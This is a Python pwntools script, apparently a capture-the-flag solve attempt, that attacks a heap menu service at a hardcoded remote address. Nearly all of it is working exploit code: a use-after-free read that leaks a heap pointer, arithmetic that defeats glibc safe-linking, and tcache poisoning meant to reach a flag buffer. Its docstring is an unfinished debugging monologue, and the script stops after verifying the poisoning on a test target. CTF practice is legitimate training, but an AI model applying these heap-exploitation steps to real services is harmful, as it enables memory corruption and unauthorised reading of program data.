#!/usr/bin/env python3
"""
Try reading the flag via a large UAF - the flag is in g_flag on heap
If we can figure out the correct offset, we can poison tcache to read it

Key realization: in solve_v7 the tcache poison WORKED when targeting X itself!
The data at spell 4 (at X) showed tcache metadata, confirming the poisoning works.

Now I need to find the right offset to g_flag.

From the analysis:
- X = spell0 addr (first user alloc)
- g_flag is BEFORE X (allocated during init)
- The offset 0x90 should work in theory, but it crashes

Let me try to understand why it crashes by examining more carefully.
Maybe the issue is that the tcache has count=1 after first alloc,
and the second alloc fails because the tcache is "logically empty"

Actually, I think the issue might be: after the first alloc (spell 3 = spell2),
the tcache head is set to REVEAL_PTR(spell2->fd) = g_flag_addr.
But the tcache count is 1 (decremented from 2 to 1).
The second alloc (spell 4) should use the tcache because count > 0.

Let me try with a more careful implementation.
"""
from pwn import *

context.log_level = 'info'

def connect():
    return remote('52.76.96.108', 9005)

def create(p, idx, size, data):
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def edit(p, idx, size, data):
    p.sendline(b'2')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def banish(p, idx):
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def recite(p, idx, size):
    p.sendline(b'4')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    data = b''
    while len(data) < size:
        chunk = p.recv(size - len(data), timeout=3)
        if not chunk:
            break
        data += chunk
    p.recv(1)
    return data

p = connect()
p.recvuntil(b'> ')
log.info("Connected")

# Let's try the simplest possible test first:
# Create spell, banish, read UAF, then try to allocate a new spell
# and read it to see what's there
log.info("=== Simple test: create, banish, allocate, read ===")

# Create spell 0
create(p, 0, 0x80, b'FIRST\n')
log.info("Created spell 0")

# Banish spell 0
banish(p, 0)
log.info("Banished spell 0")

# Read UAF to get address
data = recite(p, 0, 0x80)
fd0 = u64(data[0:8])
X = fd0 << 12
log.info(f"X = {hex(X)}")
log.info(f"UAF data[:16]: {data[:16].hex()}")

# Now create a new spell - should reuse X
create(p, 1, 0x80, b'SECOND\n')
log.info("Created spell 1 (should be at X)")

# Read UAF on spell 0 - should show SECOND
data = recite(p, 0, 0x80)
log.info(f"UAF data[:16]: {data[:16].hex()}")
if b'SECOND' in data:
    log.success("Tcache confirmed working")
else:
    log.error("Tcache broken!")

# Now the real test: create 2 MORE spells at different addresses
# Then banish them and do tcache poisoning
log.info("\n=== Tcache poisoning test ===")

# Create spell 2 (at new addr X+?)
create(p, 2, 0x80, b'THIRD\n')
log.info("Created spell 2")

# Banish spell 1 and spell 2 (spell 1 is at X, spell 2 is at new addr)
banish(p, 1)
banish(p, 2)

# Read UAF on spell 2 (tcache head)
data = recite(p, 2, 0x80)
fd2 = u64(data[0:8])
log.info(f"spell2 fd = {hex(fd2)}")

# Calculate spell2 addr
spell2_shifted = fd2 ^ X
spell2_addr = spell2_shifted << 12
log.info(f"spell2 addr = {hex(spell2_addr)}")

# The offset between X and spell2
offset_observed = spell2_addr - X
log.info(f"offset = {hex(offset_observed)}")

# Try targeting g_flag = X - 0x90
# But first, let's verify the poisoning works by targeting X
log.info("\n=== Verify poisoning: target X ===")
target = X
protected = spell2_shifted ^ target
log.info(f"protected = {hex(protected)}")

payload = p64(protected) + b'\x00' * (0x80 - 8)
edit(p, 2, 0x80, payload)

# Allocate spell 3 (returns spell2)
create(p, 3, 0x80, b'POISON\n')
log.info("Created spell 3")

# Allocate spell 4 (should return X)
create(p, 4, 0x80, b'\n')
log.info("Created spell 4")

# Read spell 4 (at X)
data = recite(p, 4, 0x80)
log.info(f"spell 4 data[:16]: {data[:16].hex()}")
# Should show zeros (we sent just newline)
# But the first 8 bytes are the protected fd from the previous tcache chain
expected = p64(protected)
log.info(f"expected first 8: {expected.hex()}")

p.sendline(b'0')
p.close()
